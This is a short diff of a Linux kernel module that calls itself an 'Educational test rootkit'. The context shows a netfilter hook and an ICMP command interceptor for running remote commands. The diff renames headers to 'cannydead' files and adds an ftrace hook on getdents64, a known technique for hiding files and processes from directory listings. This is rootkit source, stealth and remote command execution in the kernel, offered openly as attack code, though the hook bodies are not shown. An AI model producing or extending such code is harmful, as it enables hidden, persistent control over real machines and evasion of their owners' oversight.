@@ -4,8 +4,13 @@
 #include <linux/netfilter_ipv4.h>
 #include <linux/inet.h>
 #include <linux/workqueue.h>
-#include "rootkit.h"
-#include "icmp_command_interceptor.c"
+#include "cannydead_rootkit.h"
+#include "cannydead_icmp_command_interceptor.h"
+#include "cannydead_hide.h"
+#include "cannydead_ftrace_helper.h"
+
+extern asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
+extern asmlinkage long (*real_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
 
 char exec_cmd_buffer[1976];
 
@@ -40,7 +45,8 @@ static int __init startup(void)
     nfho.pf = PF_INET;
     nfho.priority = NF_IP_PRI_FIRST;
     nf_register_net_hook(&init_net, &nfho);
-    printk(KERN_WARNING "[icmpshell] WARNING: Educational test rootkit loaded into the kernel!\n");
+    printk(KERN_WARNING "[cannydead] WARNING: Educational test rootkit loaded into the kernel!\n");
+    fh_install_hook("getdents64", hooked_getdents64, (void **)&real_getdents64);
     return 0;
 }
 
